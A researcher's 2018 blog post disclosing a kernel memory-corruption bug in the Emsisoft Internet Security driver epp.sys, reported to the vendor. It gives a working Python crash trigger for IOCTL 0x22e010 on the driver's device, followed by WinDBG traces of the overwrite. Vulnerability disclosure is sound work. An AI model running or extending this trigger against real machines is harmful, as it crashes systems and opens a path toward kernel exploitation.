---
layout: post
title:  "Emsisoft Internet Security - Memory Corruption"
date:   2018-09-19 03:39:03 +0700
categories: [security, corruption]
---

Vulnerability Details
---------------------
Back in 2015, I found a vulnerability in Emsisoft Internet Security targeting the kernel epp.sys. This vulnerability is caused by the 
improper handling of IOCTL. The vulnerable IOCTL **0x22e010** with device **\\.\A2 Direct Disk Access**. I have reported the issue to the 
Emsisoft and they taking care of the issue. I have a chance working clsoely with the developer and helping them to test the beta driver 
at that time. No CVE assigned for this issue. 

The vulnerability can be easily triggered with the following POC:
```
#!/usr/bin/python
from ctypes import *
import struct

kernel32 = windll.kernel32

if __name__ == '__main__':
	GENERIC_READ  = 0x80000000
	GENERIC_WRITE = 0x40000000
	OPEN_EXISTING = 0x3
	IOCTL		  = 0x22e010
	DEVICE_NAME   = "\\\\.\\A2 Direct Disk Access"
	dwReturn      = c_ulong()
	input_size    = 1000
	input_buffer  = "\x41" * input_size
	out_size      = 1000
	output_buffer = "\x00" * out_size
	driver_handle = kernel32.CreateFileA(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, None, OPEN_EXISTING, 0, None)
				
	if driver_handle:
		dev_ioctl = kernel32.DeviceIoControl(driver_handle, IOCTL,
								input_buffer, input_size,
								output_buffer, out_size,
								byref(dwReturn), None)
	
	kernel32.CloseHandle(driver_handle)
```

If we attach WinDBG, we should be able to see the crash triage:
```
TRAP_FRAME:  8a1e88f4 -- (.trap 0xffffffff8a1e88f4)
ErrCode = 00000000
eax=00000000 ebx=00000000 ecx=fffffdff edx=8a1e89a0 esi=00000000 edi=85600000
eip=82a75ef3 esp=8a1e8968 ebp=8a1e89f4 iopl=0         nv up ei pl zr na pe nc
cs=0008  ss=0010  ds=0023  es=0023  fs=0030  gs=0000             efl=00010246
nt!RtlInitUnicodeString+0x1b:
82a75ef3 f266af          repne scas word ptr es:[edi]

Stack trace:
8a1e88dc 82a7e3d8 00000000 85600000 00000000 nt!MmAccessFault+0x106
8a1e88dc 82a75ef3 00000000 85600000 00000000 nt!KiTrap0E+0xdc
8a1e89a4 82ab5a8c 865419e0 00000000 00010000 nt!RtlInitUnicodeString+0x1b
8a1e89f4 884e40d7 855ffc00 00000003 41414141 nt!IopfCompleteRequest+0x281
WARNING: Stack unwind information not available. Following frames may be wrong.
8a1e8a18 884e428f 871f7f68 871f7fd8 871f7f68 epp+0x20d7
8a1e8a30 884eafb8 8651bd88 871f7f68 d054b72f epp+0x228f
8a1e8afc 82a74593 8651bd88 871f7f68 871f7f68 epp+0x8fb8
8a1e8b14 82c6899f 8559daa0 871f7f68 871f7fd8 nt!IofCallDriver+0x63
8a1e8b34 82c6bb71 8651bd88 8559daa0 00000000 nt!IopSynchronousServiceTail+0x1f8
8a1e8bd0 82cb23f4 8651bd88 871f7f68 00000000 nt!IopXxxControlFile+0x6aa
8a1e8c04 82a7b1ea 000000f8 00000000 00000000 nt!NtDeviceIoControlFile+0x2a
8a1e8c04 771770b4 000000f8 00000000 00000000 nt!KiFastCallEntry+0x12a
0021fa00 00000000 00000000 00000000 00000000 0x771770b4
```
Observing the stack trace, we can see the nt!IopfCompleteRequest+0x281 is sending the buffer we send to IOCTL:
```
8a1e89f4 884e40d7 855ffc00 00000003 41414141 nt!IopfCompleteRequest+0x281
```

We can overwrite something in memory and can be observe as in following:
```
kd> dc 8a1e89f4
8a1e89f4  8a1e8a18 884e40d7 855ffc00 00000003  .....@N..._.....
8a1e8a04  41414141 41414141 41414141 41414141  AAAAAAAAAAAAAAAA
8a1e8a14  871f7f68 8a1e8a30 884e428f 871f7f68  h...0....BN.h...
8a1e8a24  871f7fd8 871f7f68 00000000 8a1e8afc  ....h...........
8a1e8a34  884eafb8 8651bd88 871f7f68 d054b72f  ..N...Q.h.../.T.
8a1e8a44  8559daa0 8651bd88 00000000 9605eea8  ..Y...Q.........
8a1e8a54  8a1e8a70 82c6af69 871f7f68 85307ad8  p...i...h....z0.
8a1e8a64  8651bd88 00000000 0105eeb4 884e3868  ..Q.........h8N.
```

This contained enough information that we successfully write something in the memory. Affected module:
```
kd> lmvm epp
Browse full module list
start    end        module name
a5c55000 a5c6e000   epp      T (no symbols)           
    Loaded symbol image file: epp.sys
    Image path: \??\C:\PROGRAM FILES\EMSISOFT INTERNET SECURITY\epp.sys
    Image name: epp.sys
    Browse all global symbols  functions  data
    Timestamp:        Fri Oct 23 23:30:30 2015 (562A5296)
    CheckSum:         00024133
    ImageSize:        00019000
    Translations:     0000.04b0 0000.04e4 0409.04b0 0409.04e4
```
Sign off for now.
